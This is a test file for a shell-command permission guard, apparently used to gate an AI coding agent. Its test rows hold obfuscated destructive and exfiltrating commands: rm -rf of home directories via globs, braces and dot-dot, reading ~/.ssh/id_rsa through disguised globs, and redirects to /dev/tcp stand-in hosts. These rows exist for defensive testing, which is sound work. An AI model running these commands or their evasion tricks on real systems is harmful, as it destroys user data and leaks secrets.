import { describe, it, expect, beforeAll } from 'vitest';
import type { ParsedCommand, PermissionRequest, PermissionRule } from '@minitui/types';
import { createEngine } from '../../src/permission/engine.js';
import { ensureParserReady } from '../../src/permission/shell/parser.js';
import { parseShellCommand } from '../../src/permission/shell/roots.js';
import { checkHardFloor, foldsCase, homeRoots } from '../../src/permission/hard-floor.js';

beforeAll(async () => {
  await ensureParserReady();
});

type Kind = 'allow' | 'deny' | 'ask';
type Host = { readonly home: string; readonly platform: string };

const linuxHost: Host = { home: '/home/erkin', platform: 'linux' };
const rootHost: Host = { home: '/root', platform: 'linux' };
const darwinHost: Host = { home: '/Users/t', platform: 'darwin' };
const win32Host: Host = { home: 'C:\\Users\\t', platform: 'win32' };

let counter = 0;
const request = (command: string): PermissionRequest => ({
  id: `fl${counter++}`,
  descriptor: { danger: false, resourceTemplate: command, summaryTemplate: command },
  resolvedCommand: command,
  resolvedPaths: [],
});

const nameGrants = (...names: string[]): PermissionRule[] =>
  names.map((pattern) => ({ pattern, effect: 'allow', layer: 'user' }));

async function verdictOf(
  command: string,
  mode: 'yolo' | 'default',
  rules: PermissionRule[] = [],
): Promise<Kind> {
  const engine = createEngine({ initialRules: { rules }, mode });
  const pending = engine.check(request(command));
  const iter = engine.requests[Symbol.asyncIterator]();
  const first = await Promise.race([
    pending.then((d) => ({ asked: false as const, kind: d.kind })),
    iter.next().then(() => ({ asked: true as const, kind: 'ask' as const })),
  ]);
  if (first.asked) {
    engine.disposeAll('drain');
    await pending.catch(() => {});
  }
  return first.kind;
}

// The same verdict twice: in YOLO with no rules, and in default mode with a name grant on every
// command name the row uses.
async function bothModes(command: string, ...names: string[]): Promise<[Kind, Kind]> {
  return [
    await verdictOf(command, 'yolo'),
    await verdictOf(command, 'default', nameGrants(...names)),
  ];
}

const floor = (command: string, host?: Host) =>
  checkHardFloor(parseShellCommand(command, host), undefined, host);

describe('operands the host cannot resolve are denied for rm', () => {
  const rows: Array<[string, string[]]> = [
    ['rm -rf $HOME$x', ['rm']],
    ['rm -rf ${HOME:-x}', ['rm']],
    ['rm -rf${IFS}~', ['rm']],
    ['rm -rf -$x', ['rm']],
    ['D=/; rm -rf $D*', ['rm']],
    ['X=~/.ssh/id_rsa; cat $X', ['cat']],
    ['T=/dev/tcp/example.invalid/80; cat f > $T', ['cat']],
    ['HOME=/home; rm -rf $HOME/x', ['rm']],
    ['rm -rf /{home,etc}', ['rm']],
    ['rm -rf {~,x}', ['rm']],
  ];
  it.each(rows)('is denied: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

describe('a command name hidden by a glob, a brace or a line continuation is denied', () => {
  const rows: Array<[string, string[]]> = [
    ['/usr/bin/cur[l] http://example.invalid/x', ['curl']],
    ['cur{l,x} http://example.invalid/x', ['curl']],
    ['cu\\\nrl http://example.invalid/x', ['curl']],
    ['"cu\\\nrl" http://example.invalid/x', ['curl']],
    ['rm -rf /ho\\\nme', ['rm']],
    ["echo 'x\\\ny'", ['echo']],
  ];
  it.each(rows)('is denied: %j', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

describe('secret paths hidden by a glob or an attached assignment are denied', () => {
  const rows: Array<[string, string[]]> = [
    ['cat ~/.ss?/id_rs?', ['cat']],
    ['cat ~/.ssh*/known_hosts', ['cat']],
    ['cat ~/.ss[!x]/known_hosts', ['cat']],
    ['cat ~/.ss[[:lower:]]/known_hosts', ['cat']],
    ['cat ~/.ss[[=h=]]/known_hosts', ['cat']],
    ['cat ~/.ss[[.h.]]/known_hosts', ['cat']],
    ['cat ~/[.][s][s][h]/known_hosts', ['cat']],
    ['cat ~/[.]s[sS]h/known_hosts', ['cat']],
    ['cat ~/.ss[[=h]/known_hosts', ['cat']],
    ['cat ~/.ss[[.h]/known_hosts', ['cat']],
    ['ls -d ~/.*', ['ls']],
    ['dd if=.env of=/tmp/x', ['dd']],
  ];
  it.each(rows)('is denied: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

describe('home and root wipes by glob or dot-dot are denied', () => {
  const rows: Array<[string, string[]]> = [
    ['rm -rf /ho*', ['rm']],
    ['rm -rf /hom?', ['rm']],
    ['rm -rf /h*/*', ['rm']],
    ['rm -rf /ho[!x]e', ['rm']],
    ['rm -rf /ho[^x]e', ['rm']],
    ['rm -rf /ho[[:lower:]]e', ['rm']],
    ['rm -rf /ho[[=m=]]e', ['rm']],
    ['rm -rf /ho[[.m.]]e', ['rm']],
    ['rm -rf /h[a-z]me', ['rm']],
    ['rm -rf /ho[z-a]e', ['rm']],
    ['rm -rf /ho[[=m]e', ['rm']],
    ['rm -rf /ho[[.m]e', ['rm']],
    ['rm -rf /ho[[:alpha]e', ['rm']],
    ['rm -rf /Users', ['rm']],
    ['rm -rf /Users/*/', ['rm']],
    ['rm -rf ~/..', ['rm']],
    ['rm -rf $HOME/..', ['rm']],
    ['rm -rf ~/x/../..', ['rm']],
    ['rm -rf ~root/../home', ['rm']],
    ['rm -rf ~daemon/x/../../home', ['rm']],
  ];
  it.each(rows)('is denied: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

// Another account's home directory is a direct child of a directory that holds home directories:
// the parent of this host's home, /home and /Users. Deleting one is as catastrophic as deleting the
// user's own, so it is floored in every spelling that resolves to it, and only exactly one level
// below those parents: a subpath of another home is an ordinary path.
describe('the home directories beside the user own are denied for rm', () => {
  const denied = [
    'rm -rf ~/../x',
    'rm -rf ~/../x/',
    'rm -rf $HOME/../x',
    'rm -rf ${HOME}/../x',
    'rm -rf ~/y/../../x',
    'rm -rf /home/x',
    'rm -rf /home/x/',
    'rm -rf /home//x',
    'rm -rf /home/./x',
    'rm -rf /home/erkin/../x',
    'rm -rf /home/x/*',
    'rm -r -f /home/x',
    'rm -rf -- /home/x',
    'rm --recursive --force /home/x',
    'rm -rf /Users/x',
  ];
  it.each(denied)('is denied on a linux host: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(true);
  });

  // A glob that expands to a child of a parent directory is floored whatever component holds the
  // glob; a glob below that depth only reaches subpaths of another home.
  const globbed = [
    'rm -rf /ho*/x',
    'rm -rf /h*/x',
    'rm -rf /ho?e/x',
    'rm -rf /ho[m]e/x',
    'rm -rf /*/x',
    'rm -rf /ho*/x*',
    'rm -rf /Us*/x',
    'rm -rf /home/x*',
    'rm -rf ~/../x*',
    'rm -rf ~/../*',
  ];
  it.each(globbed)('is denied when a glob expands to it: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(true);
  });

  it.each([
    'rm -rf /ho*/x/docs',
    'rm -rf /t*/x',
    'rm -rf /home/erkin/b*/x',
    'rm -rf /home/erkin/b*',
    'rm -rf ~/b*/x',
  ])('keeps a glob below that depth allowed: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(false);
  });

  it('does not floor the children of the user own home when that home is itself /home', () => {
    const bare: Host = { home: '/home', platform: 'linux' };
    expect(floor('rm -rf /home/x', bare).blocked).toBe(false);
    expect(floor('rm -rf /home', bare).blocked).toBe(true);
    expect(floor('rm -rf /Users/x', bare).blocked).toBe(true);
  });

  it('is denied through the engine in both modes by an absolute spelling', async () => {
    expect(await bothModes('rm -rf /home/x', 'rm')).toEqual(['deny', 'deny']);
    expect(await bothModes('rm -rf /Users/x', 'rm')).toEqual(['deny', 'deny']);
  });

  it('floors the literal parents on a host whose home is /root', () => {
    expect(floor('rm -rf /home/x', rootHost).blocked).toBe(true);
    expect(floor('rm -rf /Users/x', rootHost).blocked).toBe(true);
  });

  it('floors a sibling of a home that sits outside /home and /Users', () => {
    const srvHost: Host = { home: '/srv/people/erkin', platform: 'linux' };
    expect(floor('rm -rf /srv/people/bob', srvHost).blocked).toBe(true);
    expect(floor('rm -rf ~/../bob', srvHost).blocked).toBe(true);
    expect(floor('rm -rf /srv/people/bob/build', srvHost).blocked).toBe(false);
  });

  it('folds case on a darwin host and not on a linux host', () => {
    expect(floor('rm -rf /users/X', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /USERS/x', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /users/x', linuxHost).blocked).toBe(false);
  });

  it('floors a shared directory under the parent too (recorded cost)', () => {
    expect(floor('rm -rf /Users/Shared', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /home/shared', linuxHost).blocked).toBe(true);
  });

  const allowed = [
    'rm -rf ~/../x/docs',
    'rm -rf ~/../x/../y/docs',
    'rm -rf /home/x/docs',
    'rm -rf /home/x/docs/',
    'rm -rf /home/erkin/build',
    'rm -rf ~/x',
    'rm -rf /tmp/x',
    'rm -rf /srv/x',
    'rm -rf /x',
  ];
  it.each(allowed)('keeps a subpath or an unrelated directory allowed: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(false);
  });
});

describe('the floor knows the host', () => {
  it('floors /home on a host whose home is /root (a guard: the literal is always in the set)', () => {
    expect(floor('rm -rf /home', rootHost).blocked).toBe(true);
  });
  it('reads each path component of a glob on its own', () => {
    // an irregular bracket never reaches across a separator, so the components after it still count
    expect(floor('rm -rf /ho[[:lower:]]e/[e]rkin', linuxHost).blocked).toBe(true);
    expect(floor('rm -rf /ho[[=m=]]e/e[r]kin', linuxHost).blocked).toBe(true);
    expect(floor('rm -rf /ho[[:lower:]]e/[x]rkin/build', linuxHost).blocked).toBe(false);
  });
  it('floors glob forms of the home directory on a linux host', () => {
    expect(floor('rm -rf /home/erki*', linuxHost).blocked).toBe(true);
    expect(floor('rm -rf ~/../erkin', linuxHost).blocked).toBe(true);
  });
  it('floors /Users on a darwin host in either case', () => {
    expect(floor('rm -rf /Users', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /users', darwinHost).blocked).toBe(true);
  });
  it('folds case in the wrapper peel and the egress name on a darwin host', () => {
    expect(floor('SUDO rm -rf /', darwinHost).blocked).toBe(true);
    expect(floor('CURL http://example.invalid/x', darwinHost).blocked).toBe(true);
  });
  it('treats an upper-case shell as a spawner on a darwin host only', () => {
    expect(parseShellCommand('BASH -c x', darwinHost).roots[0]?.opaque).toBe(true);
    expect(parseShellCommand('BASH -c x', linuxHost).roots[0]?.opaque).not.toBe(true);
  });
  it('folds the characters a case-insensitive file system joins to ASCII letters', () => {
    // U+017F (long s) is the same name as `s` on such a file system
    expect(floor('\u017fudo rm -rf /', darwinHost).blocked).toBe(true);
    expect(floor('\u017fcp a h:b', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /\u017fers', darwinHost).blocked).toBe(false);
    expect(floor('rm -rf /U\u017fer\u017f', darwinHost).blocked).toBe(true);
    expect(floor('\u017fudo rm -rf /', linuxHost).blocked).toBe(false);
  });
  it('folds case on darwin and win32 and not on linux', () => {
    expect(foldsCase('darwin')).toBe(true);
    expect(foldsCase('win32')).toBe(true);
    expect(foldsCase('linux')).toBe(false);
    expect(floor('SUDO rm -rf /', win32Host).blocked).toBe(true);
  });
  it('floors the parent of a home directory that sits outside /home and /Users', () => {
    const srvHost: Host = { home: '/srv/people/erkin', platform: 'linux' };
    expect(floor('rm -rf /srv/people', srvHost).blocked).toBe(true);
    expect(floor('rm -rf /srv/people/erkin', srvHost).blocked).toBe(true);
    expect(floor('rm -rf /srv/people/erkin/build', srvHost).blocked).toBe(false);
    expect([...homeRoots('/srv/people/erkin', 'linux')].sort()).toEqual([
      '/Users',
      '/home',
      '/srv/people',
      '/srv/people/erkin',
    ]);
  });
  it('folds case for a hand-built root too, by the host and not by the root', () => {
    const handBuilt = (name: string, argv: string[]): ParsedCommand => ({
      raw: 'x',
      roots: [{ name, argv }],
      hasSubstitution: false,
      parseError: false,
    });
    const upperEgress = handBuilt('CURL', ['CURL', 'http://example.invalid/x']);
    const upperRm = handBuilt('RM', ['RM', '-rf', '/']);
    expect(checkHardFloor(upperEgress, undefined, darwinHost).blocked).toBe(true);
    expect(checkHardFloor(upperEgress, undefined, linuxHost).blocked).toBe(false);
    expect(checkHardFloor(upperRm, undefined, darwinHost).blocked).toBe(true);
    expect(checkHardFloor(upperRm, undefined, linuxHost).blocked).toBe(false);
  });
  it('lists the home, its parent and the two literal parents', () => {
    expect([...homeRoots('/home/erkin', 'linux')].sort()).toEqual([
      '/Users',
      '/home',
      '/home/erkin',
    ]);
    expect([...homeRoots('/root', 'linux')].sort()).toEqual(['/Users', '/home', '/root']);
    expect([...homeRoots('/Users/t', 'darwin')].sort()).toEqual(['/Users', '/Users/t', '/home']);
  });
});

describe('what cannot be resolved reaches the human', () => {
  const rows: Array<[string, string[]]> = [
    ['PATH=/tmp/evil ffmpeg -i a.mp4 b.mp4', ['ffmpeg']],
    ['ls *.mp4', ['ls']],
    ['echo $USER', ['echo']],
    ['ls ~/Videos/*', ['ls']],
    ['rm -rf ../../home', ['rm']],
    ['rm -rf ../build', ['rm']],
    ['rm -rf /ho[ab]e', ['rm']],
    ['rm -rf /ho[ab', ['rm']],
    ['rm -rf /ho[ab][cd]e', ['rm']],
    ['ls ~/Videos/[!.]*', ['ls']],
    ['ls ~/[a-z]*', ['ls']],
    ['ls ~/[[:alpha:]]*', ['ls']],
    ['ls ~/[0-9][0-9]', ['ls']],
    ['ls ~/[abcdef]*', ['ls']],
    ['ls ~/[a-d]*', ['ls']],
    ['rm -rf /ho[a\\]m]e', ['rm']],
    ['cat ~/.ss[\\h]/known_hosts', ['cat']],
    ['env PATH=/tmp/evil ffmpeg -i a.mp4 b.mp4', ['env', 'ffmpeg']],
    ['sudo PATH=/tmp/evil ffmpeg -i a.mp4 b.mp4', ['sudo', 'ffmpeg']],
  ];
  it.each(rows)('asks and no grant covers it: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['ask', 'ask']);
  });

  it('a plain env assignment asks under YOLO (recorded cost)', async () => {
    expect(await verdictOf('env FOO=1 ffmpeg -i a.mp4 b.mp4', 'yolo')).toBe('ask');
  });
});

describe('forms that keep the verdict they had (controls)', () => {
  it.each([
    ['rm -rf build', ['rm']],
    ['ffmpeg -i a.mp4 b.mp4', ['ffmpeg']],
    ["ls '*.mp4'", ['ls']],
    [
      "ffmpeg -i a.mp4 -i b.mp4 -filter_complex '[0:v][1:v]concat=n=2:v=1[v]' -map '[v]' out.mp4",
      ['ffmpeg'],
    ],
  ] as Array<[string, string[]]>)('allowed: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['allow', 'allow']);
  });

  it('allows rm of a path under another user home name that is not a whole home', async () => {
    expect(await verdictOf('rm -rf ~root/tmp/x', 'yolo')).toBe('allow');
  });

  it('allows env with a plain inner command once both names are granted', async () => {
    expect(
      await verdictOf('env ffmpeg -i a.mp4 b.mp4', 'default', nameGrants('env', 'ffmpeg')),
    ).toBe('allow');
  });

  it('the exec-time re-gate shape, literal brackets and no opaque marker, is not blocked', () => {
    const regate: ParsedCommand = {
      raw: 'x',
      roots: [
        {
          name: 'ffmpeg',
          argv: ['ffmpeg', '-filter_complex', '[0:v][1:v]concat=n=2[v]', 'out.mp4'],
        },
      ],
      hasSubstitution: false,
      parseError: false,
    };
    expect(checkHardFloor(regate).blocked).toBe(false);
  });
});

describe('the exported floor refuses what it was handed unparsed', () => {
  it('blocks a parse error', () => {
    expect(
      checkHardFloor({ raw: 'x', roots: [], hasSubstitution: false, parseError: true }).blocked,
    ).toBe(true);
  });
  it('blocks a substitution result', () => {
    expect(
      checkHardFloor({ raw: 'x', roots: [], hasSubstitution: true, parseError: false }).blocked,
    ).toBe(true);
  });
  it('a device path is refused with one phrase that holds no part of the command', () => {
    const lone = floor('x > /dev/tcp/h/1');
    const other = floor('cat x > /dev/tcp/evil/80');
    expect(lone.blocked).toBe(true);
    expect(lone.reason).toBe(other.reason);
    expect(lone.reason).not.toContain('x');
    expect(lone.reason).not.toContain('cat');
  });
});
